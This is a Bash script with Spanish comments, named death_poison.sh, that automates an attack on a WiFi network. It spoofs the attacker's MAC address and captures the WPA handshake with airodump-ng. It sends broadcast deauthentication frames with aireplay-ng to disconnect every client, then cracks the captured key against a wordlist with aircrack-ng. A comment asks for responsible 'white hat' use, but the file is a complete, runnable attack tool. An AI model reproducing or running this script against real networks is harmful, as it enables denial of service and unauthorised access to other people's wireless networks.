#!/bin/bash
#
#Esta script esta hecho con el fin de mejorar control de procesos
#Y mejorar la logica usando pequeños detalles recien aprendidos entenderlos e usarlo de forma apropiada
#Un saludo OnSystem, juega con responsabilidad y ponte un sombrero blanco

#Paleta de colores letra
color_rojo="\e[31;1m"
color_verde="\e[32;1m"
color_amarillo="\e[33;1m"
color_azul="\e[34;1m"
color_magenta="\e[35;1m"
#Atributos del texto
negrita="\e[1m"
apagado="\e[2m"
coloreado="\e[3m"
subrayado="\e[4m"
intermitente="\e[5m"
#Reseteo de texto
color_reset="\e[0m"


#Ataque de desautentificacion de servicio
tput civis
trap ctrl_c INT
ctrl_c () {
	clear
	echo -ne "\n\t${color_rojo}Saliendo${color_reset}"
	for ((i=1;i<=5;i++))
	do
		echo -ne "${color_magenta}.${color_reset}"; sleep 0.2
	done
	tput cnorm
	echo -e "\n"
	exit 0
}
ayuda(){
	echo -e "\n\n\tUSO: death_poison.sh [OPCION]
	\n\n\t\t${color_azul}-a${color_reset} : Empezar ataque (${color_rojo}start${color_reset})
	\n\t\t${color_azul}-i${color_reset} : Especificar nombre de la tarjeta de red\n\n"
}
dependencias(){
	clear
	sleep 1
	lista_dependencias=("aircrack-ng" "macchanger" "xterm")
	for i in ${lista_dependencias[@]}
	do
		test -e /usr/bin/$i
		if [ $? == 0 ]
		then
			echo -ne "\n\t[${color_verde}X${color_reset}]"
		else
			echo -ne "\n\t[${color_rojo}V${color_reset}]"
		fi
		echo " $i"
		sleep 1.2
	done
	echo -e "\n"
}
start_attack(){
	clear
	sleep 1
	echo -e "\n\n\tEmpezando ataque"
	##OJO
	echo -e "\n\tConfigurar tarjeta de red ..."
	airmon-ng check kill $nic >& /dev/null 2>1
	airmon-ng start $nic > /dev/null
	ip link set ${nic}mon down > /dev/null 2>&1 && macchanger -a ${nic}mon > /dev/null 2>&1
	ip link set ${nic}mon up > /dev/null 2>&1; killall dhclient wpa_supplicant 2> /dev/null
	
	echo -e "\n\t[${color_magenta}*${color_reset}] Nueva direccion MAC asignada: $(macchanger -s ${nic}mon | grep -i current | xargs | cut -d ' ' -f '3-100')"

	xterm -hold -e "airodump-ng ${nic}mon" &
	xterm_airodump_PID=$!
	echo -ne "\n\t\t${color_verde}Nombre del punto de acceso: ${color_reset}" && read ap_name
	echo -ne "\n\t\t${color_verde}Canal del punto de acceso: ${color_reset}" && read ap_channel
	kill -9 $xterm_airodump_PID
	wait $xterm_airodump_PID 2>/dev/null
	
	#AIRODUMP Y AIREPLAY
	#En el aireplay seria buena idea no automatizar la difusion de mac y especificar (RECORDATORIO), ya sabes porque
	sleep 5;
	xterm -hold -e "airodump-ng -c $ap_channel -w Captura --essid $ap_name ${nic}mon" &
	xterm_airodump_filter_PID=$!
	xterm -hold -e "aireplay-ng -0 10 -e $ap_name -c FF:FF:FF:FF:FF:FF ${nic}mon" &
	#xterm_aireplay_PID=$!
	sleep 5;
	kill 9 $xterm_airodump_filter_PID; wait $xterm_airodump_filter_PID
	
	echo -e "\n\n\tDime la ruta del diccionario a usa: "
	read diccionario
	xterm -hold -e "aircrack-ng -w $diccionario Captura*.cap" &	
}
#Main

if [ $(id -u) == 0 ]
then
	while getopts ":a:i:h" arg; do
		case $arg in
			a)
				tipo_ataque="$OPTARG";;
			i)
				nic=$OPTARG;;
			h)
				ayuda;;
		esac
		
	done
	
	if [ ${tipo_ataque} == "start" ]
	then
		contador=1
		#Añdir el numero de procesos que hara la script en la condicion del while de abajo
		while [ $contador -le 3 ];do
			case $contador in
				1)
					dependencias; let contador++;;
				2)
					start_attack; let contador++;;
				3)
					tput cnorm; airmon-ng stop ${nic}mon > /dev/null 2>&1;ip link set $nic up
				       	rm Captura* 2>/dev/null;
					let contador++;;
			esac
		done
		clear; echo -e "\n\n\t${color_azul}Programa finalizado${color_reset}"
	fi
else
	echo -e "\n\t${color_rojo}Reintentalo como superususario${color_reset}"
fi


